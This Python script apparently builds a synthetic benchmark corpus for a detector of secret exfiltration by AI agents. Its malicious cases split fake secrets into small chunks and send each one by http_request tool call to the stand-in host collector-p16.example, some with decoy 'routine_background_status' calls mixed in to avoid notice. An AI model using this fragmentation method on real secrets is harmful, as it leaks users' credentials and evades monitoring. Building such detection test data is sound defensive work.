from __future__ import annotations

import base64
import hashlib
import json
import random
from pathlib import Path


SEED = 20260817
TOTAL_PER_CLASS = 400

ROOT = Path(__file__).resolve().parents[3]
OUT = (
    ROOT
    / "benchmarks"
    / "p16"
    / "corpus"
    / "p16_crosscall_corpus.jsonl"
)


def make_secret(rng: random.Random, index: int) -> str:
    alphabet = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789"

    suffix = "".join(
        rng.choice(alphabet)
        for _ in range(
            rng.randint(24, 80)
        )
    )

    return f"P16S_{index:05d}_{suffix}"


def chunk_text(
    text: str,
    chunk_size: int,
) -> list[str]:
    return [
        text[i:i + chunk_size]
        for i in range(0, len(text), chunk_size)
    ]


def benign_text(
    rng: random.Random,
    length: int,
) -> str:
    alphabet = "abcdefghijkmnopqrstuvwxyz23456789_-"

    return "".join(
        rng.choice(alphabet)
        for _ in range(length)
    )


def make_case(
    *,
    case_id: str,
    label: str,
    category: str,
    source_id: str,
    source_text: str,
    chunk_size: int,
    interleaved: bool,
    rng: random.Random,
) -> dict:

    if label == "malicious":
        pieces = chunk_text(
            source_text,
            chunk_size,
        )
    else:
        decoy = benign_text(
            rng,
            len(source_text),
        )

        pieces = chunk_text(
            decoy,
            chunk_size,
        )

    calls = []

    for i, piece in enumerate(
        pieces,
        start=1,
    ):
        calls.append({
            "tool": "http_request",
            "arguments": {
                "url": "https://collector-p16.example/api",
                "message": piece,
            },
        })

        if interleaved and i < len(pieces):
            calls.append({
                "tool": "http_request",
                "arguments": {
                    "url": "https://collector-p16.example/api",
                    "message": (
                        "routine_background_status_"
                        f"{case_id}_{i}"
                    ),
                },
            })

    return {
        "case_id": case_id,
        "label": label,
        "category": category,
        "source_id": source_id,
        "source_text": source_text,
        "chunk_size": chunk_size,
        "interleaved": interleaved,
        "calls": calls,
        "synthetic_only": True,
    }


def main() -> None:
    rng = random.Random(SEED)

    rows = []

    classes = [
        (
            "malicious",
            "cross_call_fragmentation",
            False,
        ),
        (
            "malicious",
            "interleaved_cross_call_fragmentation",
            True,
        ),
        (
            "benign",
            "cross_call_fragmentation",
            False,
        ),
        (
            "benign",
            "interleaved_cross_call_fragmentation",
            True,
        ),
    ]

    case_index = 0

    for label, category, interleaved in classes:
        for _ in range(TOTAL_PER_CLASS):
            case_index += 1

            secret = make_secret(
                rng,
                case_index,
            )

            chunk_size = rng.choice([
                2,
                3,
                4,
                5,
                6,
                7,
                8,
                10,
                12,
            ])

            rows.append(
                make_case(
                    case_id=(
                        f"P16_{label[0].upper()}_"
                        f"{category}_{case_index:05d}"
                    ),
                    label=label,
                    category=category,
                    source_id=(
                        f"p16-source-{case_index:05d}"
                    ),
                    source_text=secret,
                    chunk_size=chunk_size,
                    interleaved=interleaved,
                    rng=rng,
                )
            )

    rng.shuffle(rows)

    OUT.parent.mkdir(
        parents=True,
        exist_ok=True,
    )

    with OUT.open(
        "w",
        encoding="utf-8",
    ) as f:
        for row in rows:
            f.write(
                json.dumps(
                    row,
                    sort_keys=True,
                )
                + "\n"
            )

    digest = hashlib.sha256(
        OUT.read_bytes()
    ).hexdigest().upper()

    print("=" * 100)
    print("P16 CROSS-CALL NEUTRAL CORPUS")
    print("=" * 100)
    print("Seed       :", SEED)
    print("Cases      :", len(rows))
    print("SHA-256    :", digest)
    print("Output     :", OUT)
    print()
    print("[PASS] Synthetic-only corpus generated.")
    print("[PASS] No ProvProxy imported.")
    print("[PASS] No detector executed.")
    print("=" * 100)


if __name__ == "__main__":
    main()
